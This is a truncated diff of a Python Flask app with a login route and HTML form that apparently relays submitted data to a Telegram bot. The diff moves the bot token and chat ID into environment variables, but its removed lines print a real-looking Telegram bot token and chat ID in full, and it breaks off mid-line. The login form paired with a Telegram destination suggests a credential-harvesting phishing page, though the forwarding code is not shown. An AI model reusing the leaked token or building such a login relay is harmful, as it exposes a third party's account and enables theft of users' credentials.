@@ -1,10 +1,11 @@
 from flask import Flask, request, render_template_string
 import requests
+import os
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8867215064:AAHaomB_Adr3srjsTOOYwrsyM426qRcspvg"
-CHAT_ID = "811425426"
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
 
 HTML_FORM = """
 <!DOCTYPE html>
@@ -50,4 +51,4 @@ def login():
     return render_template_string(HTML_FORM, sent=sent)
 
 if __name__ == "__main__":
-    app.run(debug=True, port=5000)
+    port = int(os.environ.get("PORT",
